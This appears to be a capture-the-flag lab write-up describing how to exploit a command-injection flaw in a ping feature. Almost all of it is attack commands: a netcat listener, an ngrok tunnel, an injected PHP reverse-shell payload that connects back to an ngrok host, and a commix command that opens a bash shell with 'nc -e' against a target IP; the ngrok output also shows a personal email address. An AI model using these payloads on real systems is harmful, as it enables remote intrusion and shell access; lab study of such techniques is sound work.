
> [!NOTE] Problem
> Get Flag by attacking passing Command Injection


1. from target website is use ping from os command so we will use reverse shell for attacking

2. prepare shell
```bash
nc -lvnp 10000
```

3. prepare ngrok
```bash
ngrok tcp 10000
```

```bash
Session Status                online
Account                       siriwat.chr@gmail.com (Plan: Free)
Version                       3.33.0
Region                        Asia Pacific (ap)
Latency                       40ms
Web Interface                 http://127.0.0.1:4040
Forwarding                    tcp://0.tcp.ap.ngrok.io:15528 -> localhost:10000

```

4. attacking
```bash
localhost; php -r '$sock=fsockopen("0.tcp.ap.ngrok.io",15528);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## commix
1. if you want to using commix in this lab you need to do `2` and `3`
2. and use this command
```bash
commix --url="http://34.124.180.95" --data="target=127.0.0.1" --batch --os-cmd="nc 0.tcp.ap.ngrok.io 18634 -e /bin/bash"
```
